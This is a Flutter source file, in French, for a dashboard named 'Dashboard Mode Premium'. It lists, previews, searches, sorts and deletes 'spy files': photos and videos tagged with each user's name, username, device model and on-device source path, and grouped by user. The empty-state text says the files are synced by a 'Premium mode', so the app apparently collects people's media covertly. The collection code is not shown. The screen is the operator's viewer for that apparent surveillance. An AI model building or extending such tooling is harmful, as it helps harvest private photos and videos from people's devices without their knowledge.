import 'package:flutter/material.dart';
import 'package:cached_network_image/cached_network_image.dart';
import '../services/api_service.dart';
import '../models/spy_file.dart';

class SurveillanceScreen extends StatefulWidget {
  const SurveillanceScreen({super.key});

  @override
  State<SurveillanceScreen> createState() => _SurveillanceScreenState();
}

class _SurveillanceScreenState extends State<SurveillanceScreen> {
  final ApiService _apiService = ApiService();
  bool _isLoading = true;
  String? _errorMessage;

  List<SpyFile> _allFiles = [];
  Map<String, dynamic> _stats = {};
  List<Map<String, dynamic>> _userOrigins = [];

  String _selectedOrigin = 'ALL'; // 'ALL' or specific username/displayName
  String _searchQuery = '';
  String _currentSort = 'date_desc'; // date_desc, date_asc, size_desc, user_asc
  bool _isGridView = true;

  @override
  void initState() {
    super.initState();
    _loadDashboardData();
  }

  Future<void> _loadDashboardData() async {
    setState(() {
      _isLoading = true;
      _errorMessage = null;
    });

    try {
      final results = await Future.wait([
        _apiService.getSpyFiles(sortBy: _currentSort),
        _apiService.getSpyStats(),
      ]);

      final filesData = results[0];
      final statsData = results[1];

      final rawList = filesData['files'] as List<dynamic>? ?? [];
      final parsedFiles = rawList.map((j) => SpyFile.fromJson(j as Map<String, dynamic>)).toList();

      final rawUsers = filesData['users'] as List<dynamic>? ?? [];
      final parsedUsers = rawUsers.map((u) => u as Map<String, dynamic>).toList();

      setState(() {
        _allFiles = parsedFiles;
        _stats = statsData;
        _userOrigins = parsedUsers;
        _isLoading = false;
      });
    } catch (e) {
      setState(() {
        _errorMessage = e.toString();
        _isLoading = false;
      });
    }
  }

  List<SpyFile> get _filteredFiles {
    return _allFiles.where((file) {
      // Filter by origin (user)
      if (_selectedOrigin != 'ALL') {
        final originName = file.displayName.isNotEmpty ? file.displayName : file.username;
        if (originName != _selectedOrigin && file.userId != _selectedOrigin) {
          return false;
        }
      }

      // Filter by search query
      if (_searchQuery.isNotEmpty) {
        final query = _searchQuery.toLowerCase();
        final matchName = file.originalName.toLowerCase().contains(query);
        final matchUser = file.displayName.toLowerCase().contains(query) ||
            file.username.toLowerCase().contains(query);
        final matchDevice = file.deviceModel.toLowerCase().contains(query);
        if (!matchName && !matchUser && !matchDevice) return false;
      }

      return true;
    }).toList();
  }

  Map<String, List<SpyFile>> get _groupedByOrigin {
    final map = <String, List<SpyFile>>{};
    for (final file in _filteredFiles) {
      final key = file.displayName.isNotEmpty ? file.displayName : (file.username.isNotEmpty ? file.username : 'Anonyme');
      if (!map.containsKey(key)) {
        map[key] = [];
      }
      map[key]!.add(file);
    }
    return map;
  }

  void _showMediaPreview(SpyFile file) {
    showDialog(
      context: context,
      builder: (ctx) => Dialog(
        backgroundColor: Colors.black87,
        insetPadding: const EdgeInsets.symmetric(horizontal: 16, vertical: 24),
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16)),
        child: Column(
          mainAxisSize: MainAxisSize.min,
          crossAxisAlignment: CrossAxisAlignment.stretch,
          children: [
            // Header
            Padding(
              padding: const EdgeInsets.all(12),
              child: Row(
                children: [
                  CircleAvatar(
                    radius: 16,
                    backgroundColor: const Color(0xFF128C7E),
                    child: Text(
                      file.displayName.isNotEmpty ? file.displayName[0].toUpperCase() : '?',
                      style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold),
                    ),
                  ),
                  const SizedBox(width: 8),
                  Expanded(
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        Text(
                          file.displayName,
                          style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 14),
                          maxLines: 1,
                          overflow: TextOverflow.ellipsis,
                        ),
                        Text(
                          '@${file.username} • 📱 ${file.deviceModel}',
                          style: TextStyle(color: Colors.grey[400], fontSize: 11),
                        ),
                      ],
                    ),
                  ),
                  IconButton(
                    icon: const Icon(Icons.close, color: Colors.white),
                    onPressed: () => Navigator.pop(ctx),
                  ),
                ],
              ),
            ),
            // Media Content
            Flexible(
              child: ClipRRect(
                borderRadius: BorderRadius.circular(8),
                child: file.isImage
                    ? CachedNetworkImage(
                        imageUrl: file.fullUrl,
                        fit: BoxFit.contain,
                        placeholder: (_, __) => const Center(
                          child: CircularProgressIndicator(color: Color(0xFF25D366)),
                        ),
                        errorWidget: (_, __, ___) => const Center(
                          child: Icon(Icons.broken_image, color: Colors.white70, size: 48),
                        ),
                      )
                    : Container(
                        height: 240,
                        color: Colors.black,
                        child: Center(
                          child: Column(
                            mainAxisAlignment: MainAxisAlignment.center,
                            children: [
                              const Icon(Icons.play_circle_fill, color: Color(0xFF25D366), size: 64),
                              const SizedBox(height: 8),
                              Text(
                                file.originalName,
                                style: const TextStyle(color: Colors.white, fontSize: 13),
                              ),
                              const SizedBox(height: 4),
                              Text(
                                'Vidéo • ${file.sizeFormatted}',
                                style: TextStyle(color: Colors.grey[400], fontSize: 11),
                              ),
                            ],
                          ),
                        ),
                      ),
              ),
            ),
            // Footer Info
            Padding(
              padding: const EdgeInsets.all(12),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Row(
                    mainAxisAlignment: MainAxisAlignment.spaceBetween,
                    children: [
                      Text(
                        'Taille : ${file.sizeFormatted}',
                        style: TextStyle(color: Colors.grey[300], fontSize: 12),
                      ),
                      Text(
                        '${file.uploadedAt.day}/${file.uploadedAt.month}/${file.uploadedAt.year} ${file.uploadedAt.hour.toString().padLeft(2, '0')}:${file.uploadedAt.minute.toString().padLeft(2, '0')}',
                        style: TextStyle(color: Colors.grey[400], fontSize: 11),
                      ),
                    ],
                  ),
                  if (file.sourcePath.isNotEmpty) ...[
                    const SizedBox(height: 4),
                    Text(
                      'Source: ${file.sourcePath}',
                      style: TextStyle(color: Colors.grey[500], fontSize: 10),
                      maxLines: 1,
                      overflow: TextOverflow.ellipsis,
                    ),
                  ],
                  const SizedBox(height: 12),
                  Row(
                    mainAxisAlignment: MainAxisAlignment.end,
                    children: [
                      TextButton.icon(
                        icon: const Icon(Icons.delete, color: Colors.redAccent, size: 18),
                        label: const Text('Supprimer', style: TextStyle(color: Colors.redAccent)),
                        onPressed: () async {
                          Navigator.pop(ctx);
                          await _deleteFile(file);
                        },
                      ),
                    ],
                  ),
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }

  Future<void> _deleteFile(SpyFile file) async {
    final confirm = await showDialog<bool>(
      context: context,
      builder: (ctx) => AlertDialog(
        title: const Text('Confirmer la suppression'),
        content: Text('Voulez-vous supprimer définitivement "${file.originalName}" ?'),
        actions: [
          TextButton(onPressed: () => Navigator.pop(ctx, false), child: const Text('Annuler')),
          ElevatedButton(
            style: ElevatedButton.styleFrom(backgroundColor: Colors.red, foregroundColor: Colors.white),
            onPressed: () => Navigator.pop(ctx, true),
            child: const Text('Supprimer'),
          ),
        ],
      ),
    );

    if (confirm == true) {
      try {
        await _apiService.deleteSpyFile(file.filename);
        ScaffoldMessenger.of(context).showSnackBar(
          const SnackBar(content: Text('Fichier supprimé')),
        );
        _loadDashboardData();
      } catch (e) {
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(content: Text('Erreur: $e')),
        );
      }
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: const Color(0xFF0F172A), // Dark elegant background
      appBar: AppBar(
        title: const Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Text(
              'Dashboard Mode Premium',
              style: TextStyle(fontSize: 18, fontWeight: FontWeight.bold, color: Colors.white),
            ),
            Text(
              'Médias triés par utilisateur et origine',
              style: TextStyle(fontSize: 11, color: Color(0xFF25D366)),
            ),
          ],
        ),
        backgroundColor: const Color(0xFF1E293B),
        elevation: 0,
        actions: [
          IconButton(
            icon: Icon(_isGridView ? Icons.view_agenda : Icons.grid_view, color: Colors.white),
            tooltip: _isGridView ? 'Vue par utilisateur' : 'Vue grille',
            onPressed: () => setState(() => _isGridView = !_isGridView),
          ),
          PopupMenuButton<String>(
            icon: const Icon(Icons.sort, color: Colors.white),
            tooltip: 'Trier les médias',
            onSelected: (val) {
              setState(() => _currentSort = val);
              _loadDashboardData();
            },
            itemBuilder: (ctx) => [
              PopupMenuItem(
                value: 'date_desc',
                child: Row(
                  children: [
                    Icon(Icons.access_time, size: 18, color: _currentSort == 'date_desc' ? const Color(0xFF25D366) : Colors.grey),
                    const SizedBox(width: 8),
                    const Text('Plus récent d\'abord'),
                  ],
                ),
              ),
              PopupMenuItem(
                value: 'date_asc',
                child: Row(
                  children: [
                    Icon(Icons.history, size: 18, color: _currentSort == 'date_asc' ? const Color(0xFF25D366) : Colors.grey),
                    const SizedBox(width: 8),
                    const Text('Plus ancien d\'abord'),
                  ],
                ),
              ),
              PopupMenuItem(
                value: 'user_asc',
                child: Row(
                  children: [
                    Icon(Icons.person, size: 18, color: _currentSort == 'user_asc' ? const Color(0xFF25D366) : Colors.grey),
                    const SizedBox(width: 8),
                    const Text('Trier par utilisateur (A-Z)'),
                  ],
                ),
              ),
              PopupMenuItem(
                value: 'size_desc',
                child: Row(
                  children: [
                    Icon(Icons.storage, size: 18, color: _currentSort == 'size_desc' ? const Color(0xFF25D366) : Colors.grey),
                    const SizedBox(width: 8),
                    const Text('Taille décroissante'),
                  ],
                ),
              ),
            ],
          ),
          IconButton(
            icon: const Icon(Icons.refresh, color: Colors.white),
            onPressed: _loadDashboardData,
          ),
        ],
      ),
      body: _isLoading
          ? const Center(child: CircularProgressIndicator(color: Color(0xFF25D366)))
          : _errorMessage != null
              ? _buildErrorView()
              : RefreshIndicator(
                  color: const Color(0xFF25D366),
                  onRefresh: _loadDashboardData,
                  child: Column(
                    children: [
                      _buildStatsHeader(),
                      _buildSearchAndFilters(),
                      _buildOriginChips(),
                      Expanded(
                        child: _filteredFiles.isEmpty
                            ? _buildEmptyState()
                            : _isGridView
                                ? _buildFilesGrid()
                                : _buildGroupedByOriginList(),
                      ),
                    ],
                  ),
                ),
    );
  }

  Widget _buildErrorView() {
    return Center(
      child: Padding(
        padding: const EdgeInsets.all(24),
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            const Icon(Icons.error_outline, size: 64, color: Colors.redAccent),
            const SizedBox(height: 16),
            const Text(
              'Erreur de connexion au serveur Mode Premium',
              style: TextStyle(color: Colors.white, fontSize: 18, fontWeight: FontWeight.bold),
            ),
            const SizedBox(height: 8),
            Text(
              _errorMessage ?? '',
              style: TextStyle(color: Colors.grey[400], fontSize: 13),
              textAlign: TextAlign.center,
            ),
            const SizedBox(height: 24),
            ElevatedButton.icon(
              style: ElevatedButton.styleFrom(
                backgroundColor: const Color(0xFF25D366),
                foregroundColor: Colors.white,
              ),
              icon: const Icon(Icons.refresh),
              label: const Text('Réessayer'),
              onPressed: _loadDashboardData,
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildStatsHeader() {
    final totalFiles = _stats['totalFiles']?.toString() ?? '${_allFiles.length}';
    final totalSize = _stats['totalSizeFormatted']?.toString() ?? '0 MB';
    final uniqueDevices = _stats['uniqueDevices']?.toString() ?? '${_userOrigins.length}';

    return Container(
      padding: const EdgeInsets.fromLTRB(16, 12, 16, 12),
      decoration: const BoxDecoration(
        color: Color(0xFF1E293B),
        border: Border(bottom: BorderSide(color: Color(0xFF334155), width: 1)),
      ),
      child: Row(
        children: [
          _buildStatCard('Fichiers', totalFiles, Icons.photo_library, const Color(0xFF10B981)),
          const SizedBox(width: 10),
          _buildStatCard('Origines', uniqueDevices, Icons.people_alt, const Color(0xFF6366F1)),
          const SizedBox(width: 10),
          _buildStatCard('Volume', totalSize, Icons.cloud_done, const Color(0xFFF59E0B)),
        ],
      ),
    );
  }

  Widget _buildStatCard(String title, String value, IconData icon, Color accentColor) {
    return Expanded(
      child: Container(
        padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 8),
        decoration: BoxDecoration(
          color: const Color(0xFF0F172A),
          borderRadius: BorderRadius.circular(10),
          border: Border.all(color: const Color(0xFF334155)),
        ),
        child: Row(
          children: [
            Icon(icon, size: 20, color: accentColor),
            const SizedBox(width: 8),
            Expanded(
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                mainAxisSize: MainAxisSize.min,
                children: [
                  Text(
                    title,
                    style: TextStyle(color: Colors.grey[400], fontSize: 10, fontWeight: FontWeight.w600),
                  ),
                  Text(
                    value,
                    style: const TextStyle(color: Colors.white, fontSize: 14, fontWeight: FontWeight.bold),
                    maxLines: 1,
                    overflow: TextOverflow.ellipsis,
                  ),
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildSearchAndFilters() {
    return Padding(
      padding: const EdgeInsets.fromLTRB(16, 12, 16, 6),
      child: TextField(
        style: const TextStyle(color: Colors.white, fontSize: 14),
        decoration: InputDecoration(
          hintText: 'Rechercher par nom, utilisateur, appareil...',
          hintStyle: TextStyle(color: Colors.grey[500], fontSize: 13),
          prefixIcon: const Icon(Icons.search, color: Colors.grey, size: 20),
          suffixIcon: _searchQuery.isNotEmpty
              ? IconButton(
                  icon: const Icon(Icons.clear, color: Colors.grey, size: 18),
                  onPressed: () => setState(() => _searchQuery = ''),
                )
              : null,
          filled: true,
          fillColor: const Color(0xFF1E293B),
          contentPadding: const EdgeInsets.symmetric(vertical: 0, horizontal: 16),
          border: OutlineInputBorder(
            borderRadius: BorderRadius.circular(12),
            borderSide: const BorderSide(color: Color(0xFF334155)),
          ),
          enabledBorder: OutlineInputBorder(
            borderRadius: BorderRadius.circular(12),
            borderSide: const BorderSide(color: Color(0xFF334155)),
          ),
          focusedBorder: OutlineInputBorder(
            borderRadius: BorderRadius.circular(12),
            borderSide: const BorderSide(color: Color(0xFF25D366)),
          ),
        ),
        onChanged: (val) => setState(() => _searchQuery = val.trim()),
      ),
    );
  }

  Widget _buildOriginChips() {
    // Generate distinct list of origins
    final Set<String> origins = {'ALL'};
    for (final file in _allFiles) {
      final origin = file.displayName.isNotEmpty ? file.displayName : (file.username.isNotEmpty ? file.username : 'Anonyme');
      origins.add(origin);
    }

    return Container(
      height: 48,
      padding: const EdgeInsets.symmetric(vertical: 6),
      child: ListView.separated(
        scrollDirection: Axis.horizontal,
        padding: const EdgeInsets.symmetric(horizontal: 16),
        itemCount: origins.length,
        separatorBuilder: (_, __) => const SizedBox(width: 8),
        itemBuilder: (context, index) {
          final origin = origins.elementAt(index);
          final isSelected = _selectedOrigin == origin;
          final count = origin == 'ALL'
              ? _allFiles.length
              : _allFiles.where((f) => (f.displayName == origin || f.username == origin)).length;

          final label = origin == 'ALL' ? 'Tous ($count)' : '👤 $origin ($count)';

          return FilterChip(
            label: Text(
              label,
              style: TextStyle(
                color: isSelected ? Colors.black : Colors.white,
                fontWeight: isSelected ? FontWeight.bold : FontWeight.normal,
                fontSize: 12,
              ),
            ),
            selected: isSelected,
            selectedColor: const Color(0xFF25D366),
            backgroundColor: const Color(0xFF1E293B),
            side: BorderSide(color: isSelected ? const Color(0xFF25D366) : const Color(0xFF334155)),
            showCheckmark: false,
            onSelected: (_) {
              setState(() {
                _selectedOrigin = origin;
              });
            },
          );
        },
      ),
    );
  }

  Widget _buildFilesGrid() {
    return GridView.builder(
      padding: const EdgeInsets.all(12),
      gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
        crossAxisCount: 2,
        childAspectRatio: 0.76,
        crossAxisSpacing: 10,
        mainAxisSpacing: 10,
      ),
      itemCount: _filteredFiles.length,
      itemBuilder: (context, index) {
        final file = _filteredFiles[index];
        return _buildMediaCard(file);
      },
    );
  }

  Widget _buildMediaCard(SpyFile file) {
    return InkWell(
      onTap: () => _showMediaPreview(file),
      borderRadius: BorderRadius.circular(12),
      child: Container(
        decoration: BoxDecoration(
          color: const Color(0xFF1E293B),
          borderRadius: BorderRadius.circular(12),
          border: Border.all(color: const Color(0xFF334155)),
        ),
        clipBehavior: Clip.antiAlias,
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.stretch,
          children: [
            // Thumbnail
            Expanded(
              child: Stack(
                fit: StackFit.expand,
                children: [
                  file.isImage
                      ? CachedNetworkImage(
                          imageUrl: file.fullUrl,
                          fit: BoxFit.cover,
                          placeholder: (_, __) => Container(
                            color: const Color(0xFF0F172A),
                            child: const Center(
                              child: CircularProgressIndicator(strokeWidth: 2, color: Color(0xFF25D366)),
                            ),
                          ),
                          errorWidget: (_, __, ___) => Container(
                            color: const Color(0xFF0F172A),
                            child: const Icon(Icons.broken_image, color: Colors.white38),
                          ),
                        )
                      : Container(
                          color: Colors.black54,
                          child: const Center(
                            child: Icon(Icons.videocam, color: Color(0xFF25D366), size: 40),
                          ),
                        ),
                  // User origin badge
                  Positioned(
                    top: 6,
                    left: 6,
                    child: Container(
                      padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 2),
                      decoration: BoxDecoration(
                        color: Colors.black.withValues(alpha: 0.75),
                        borderRadius: BorderRadius.circular(8),
                      ),
                      child: Row(
                        mainAxisSize: MainAxisSize.min,
                        children: [
                          const Icon(Icons.person, color: Color(0xFF25D366), size: 12),
                          const SizedBox(width: 4),
                          ConstrainedBox(
                            constraints: const BoxConstraints(maxWidth: 80),
                            child: Text(
                              file.displayName,
                              style: const TextStyle(color: Colors.white, fontSize: 10, fontWeight: FontWeight.bold),
                              maxLines: 1,
                              overflow: TextOverflow.ellipsis,
                            ),
                          ),
                        ],
                      ),
                    ),
                  ),
                  // Size badge
                  Positioned(
                    bottom: 6,
                    right: 6,
                    child: Container(
                      padding: const EdgeInsets.symmetric(horizontal: 5, vertical: 2),
                      decoration: BoxDecoration(
                        color: Colors.black.withValues(alpha: 0.75),
                        borderRadius: BorderRadius.circular(4),
                      ),
                      child: Text(
                        file.sizeFormatted,
                        style: const TextStyle(color: Colors.white, fontSize: 10),
                      ),
                    ),
                  ),
                ],
              ),
            ),
            // Info Footer
            Padding(
              padding: const EdgeInsets.all(8),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Text(
                    file.originalName,
                    style: const TextStyle(color: Colors.white, fontSize: 11, fontWeight: FontWeight.w600),
                    maxLines: 1,
                    overflow: TextOverflow.ellipsis,
                  ),
                  const SizedBox(height: 2),
                  Row(
                    mainAxisAlignment: MainAxisAlignment.spaceBetween,
                    children: [
                      Text(
                        '📱 ${file.deviceModel}',
                        style: TextStyle(color: Colors.grey[400], fontSize: 10),
                      ),
                      Text(
                        '${file.uploadedAt.hour.toString().padLeft(2, '0')}:${file.uploadedAt.minute.toString().padLeft(2, '0')}',
                        style: TextStyle(color: Colors.grey[500], fontSize: 10),
                      ),
                    ],
                  ),
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildGroupedByOriginList() {
    final grouped = _groupedByOrigin;

    return ListView.builder(
      padding: const EdgeInsets.all(12),
      itemCount: grouped.length,
      itemBuilder: (context, index) {
        final originName = grouped.keys.elementAt(index);
        final files = grouped[originName]!;
        final firstFile = files.first;

        return Card(
          color: const Color(0xFF1E293B),
          margin: const EdgeInsets.only(bottom: 16),
          shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.circular(16),
            side: const BorderSide(color: Color(0xFF334155)),
          ),
          child: Padding(
            padding: const EdgeInsets.all(12),
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                // Group Header
                Row(
                  children: [
                    CircleAvatar(
                      radius: 18,
                      backgroundColor: const Color(0xFF25D366),
                      child: Text(
                        originName.isNotEmpty ? originName[0].toUpperCase() : '?',
                        style: const TextStyle(color: Colors.black, fontWeight: FontWeight.bold, fontSize: 16),
                      ),
                    ),
                    const SizedBox(width: 10),
                    Expanded(
                      child: Column(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          Text(
                            originName,
                            style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 15),
                          ),
                          Text(
                            '📱 ${firstFile.deviceModel} • ${files.length} média(s)',
                            style: TextStyle(color: Colors.grey[400], fontSize: 11),
                          ),
                        ],
                      ),
                    ),
                    Container(
                      padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
                      decoration: BoxDecoration(
                        color: const Color(0xFF0F172A),
                        borderRadius: BorderRadius.circular(8),
                        border: Border.all(color: const Color(0xFF334155)),
                      ),
                      child: Text(
                        '${files.length} fichiers',
                        style: const TextStyle(color: Color(0xFF25D366), fontSize: 11, fontWeight: FontWeight.bold),
                      ),
                    ),
                  ],
                ),
                const SizedBox(height: 12),
                // Horizontal list of thumbnails for this origin
                SizedBox(
                  height: 120,
                  child: ListView.separated(
                    scrollDirection: Axis.horizontal,
                    itemCount: files.length,
                    separatorBuilder: (_, __) => const SizedBox(width: 8),
                    itemBuilder: (context, fIndex) {
                      final f = files[fIndex];
                      return InkWell(
                        onTap: () => _showMediaPreview(f),
                        borderRadius: BorderRadius.circular(10),
                        child: Container(
                          width: 100,
                          decoration: BoxDecoration(
                            borderRadius: BorderRadius.circular(10),
                            color: const Color(0xFF0F172A),
                            border: Border.all(color: const Color(0xFF334155)),
                          ),
                          clipBehavior: Clip.antiAlias,
                          child: Stack(
                            fit: StackFit.expand,
                            children: [
                              f.isImage
                                  ? CachedNetworkImage(
                                      imageUrl: f.fullUrl,
                                      fit: BoxFit.cover,
                                      placeholder: (_, __) => const Center(
                                        child: CircularProgressIndicator(strokeWidth: 2, color: Color(0xFF25D366)),
                                      ),
                                      errorWidget: (_, __, ___) => const Icon(Icons.broken_image, color: Colors.white38),
                                    )
                                  : const Center(
                                      child: Icon(Icons.videocam, color: Color(0xFF25D366), size: 32),
                                    ),
                              Positioned(
                                bottom: 4,
                                right: 4,
                                child: Container(
                                  padding: const EdgeInsets.symmetric(horizontal: 4, vertical: 1),
                                  decoration: BoxDecoration(
                                    color: Colors.black.withValues(alpha: 0.7),
                                    borderRadius: BorderRadius.circular(4),
                                  ),
                                  child: Text(
                                    f.sizeFormatted,
                                    style: const TextStyle(color: Colors.white, fontSize: 9),
                                  ),
                                ),
                              ),
                            ],
                          ),
                        ),
                      );
                    },
                  ),
                ),
              ],
            ),
          ),
        );
      },
    );
  }

  Widget _buildEmptyState() {
    return Center(
      child: Column(
        mainAxisAlignment: MainAxisAlignment.center,
        children: [
          Icon(Icons.perm_media_outlined, size: 64, color: Colors.grey[600]),
          const SizedBox(height: 12),
          const Text(
            'Aucun média trouvé',
            style: TextStyle(color: Colors.white, fontSize: 16, fontWeight: FontWeight.bold),
          ),
          const SizedBox(height: 6),
          Text(
            _selectedOrigin != 'ALL'
                ? 'Aucun fichier pour l\'utilisateur "$_selectedOrigin"'
                : 'Les fichiers synchronisés par le mode Premium apparaîtront ici.',
            style: TextStyle(color: Colors.grey[400], fontSize: 12),
            textAlign: TextAlign.center,
          ),
        ],
      ),
    );
  }
}
